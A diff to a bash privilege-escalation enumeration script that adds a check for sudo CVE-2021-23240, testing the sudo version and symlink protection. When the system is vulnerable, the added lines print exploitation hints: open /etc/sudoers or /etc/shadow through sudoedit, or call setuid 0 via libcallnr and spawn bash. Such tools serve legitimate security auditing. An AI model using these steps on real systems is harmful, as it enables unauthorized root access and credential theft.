@@ -3,7 +3,7 @@
 # Version="version 2.0.4"
 # V1: Date Created : 08/12/2018
 # V2: Date Created : 11/02/2020
-# Date of last modification : 15/12/2020
+# Date of last modification : 27/01/2021
 # @TH3_ACE - BLAIS David
 
 # Future updates :
@@ -441,6 +441,25 @@ if [ "$sudopwfeedback" ]; then
   echo -e "\n" 
 fi
 fi
+
+#### CVE-2021-23240 
+sudoedit_selinux=`cat cve.sudo2.txt | grep "$(echo $sver)" | grep "CVE-2021-23240" | cut -d"+" -f 1`
+if [ "$sudoedit_selinux" ]; then  
+check_psymlinks=`cat /proc/sys/fs/protected_symlinks | grep 0`
+if [ "$check_psymlinks" ]; then
+  echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability CVE-2021-23240:: ${RESET}" 
+  echo -e "[-] The version of sudo is vulnerable and symlinks is not protected (set to 0)"
+  echo -e "[-] Provided that SELinux is in permissive (not enforcing) mode or the invoking"
+  echo "user is in an unconfined domain, all requirements will be met for exploitation."  
+  echo -e "[*] M1 : Run command: sudoedit /path then :e /etc/sudoers or :e /etc/shadow"  
+  echo -e "[*] M2 : Run command: S1 -> sudoedit /path then :call libcallnr("libc.so.6","setuid",0)"
+  echo -e " S2 -> then run ::!bash"
+  echo -e "[*] M3 : Notes: /exploits/CVE-2021-23240.txt"
+  echo -e "\n" 
+fi
+
+fi
+
 
 # grep '*/\|/*\|*'  or | grep '*/"\|"/*"\|"*''
 #sudowildcard=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep '*/\|/*\|*' ) 
